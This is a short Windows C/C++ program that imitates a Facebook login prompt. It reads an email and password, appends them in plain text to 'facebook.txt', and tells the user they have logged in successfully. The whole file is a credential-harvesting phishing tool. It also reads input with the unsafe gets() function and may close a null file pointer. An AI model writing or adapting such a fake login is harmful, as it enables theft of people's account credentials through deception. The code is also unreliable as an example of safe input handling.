#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<windows.h>
using namespace std;
int main(){
    char email[50];
    char password[50];
    printf("Email: ");
    gets(email);
    printf("Enter password: ");
    gets(password);
    FILE *instream;
    instream = fopen("facebook.txt", "a");
    if(instream != NULL){
        
        fprintf(instream,"Email: %s\n", email);
        fprintf(instream,"Password: %s\n", password);
        fprintf(instream,"%s", "You have logged into facebook\n");
        printf("Welcome to facebook! You have logged in successfully!");
    }else{
        printf("The authentication failed. Try again!");
    }
    fclose(instream);
    Sleep(5000);
}
